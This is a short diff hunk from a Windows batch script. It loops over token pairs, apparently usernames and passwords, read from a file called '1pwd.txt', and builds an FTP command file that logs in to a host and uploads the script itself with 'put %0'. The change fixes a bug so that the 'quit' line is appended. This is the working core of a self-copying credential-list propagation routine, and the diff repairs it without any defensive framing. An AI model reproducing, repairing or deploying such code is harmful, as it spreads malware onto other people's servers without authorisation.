@@ -98,7 +98,7 @@ for /f "tokens=1, 2 delims= " %%a in (1pwd.txt) do (
 echo %%a >> DSc.txt
 echo %%b >> DSc.txt
 echo put %0 >> DSc.txt
-echo quit > DSc.txt
+echo quit >> DSc.txt
 ftp -s:DSc.txt %host%
 del /f /q DSc.txt
 )
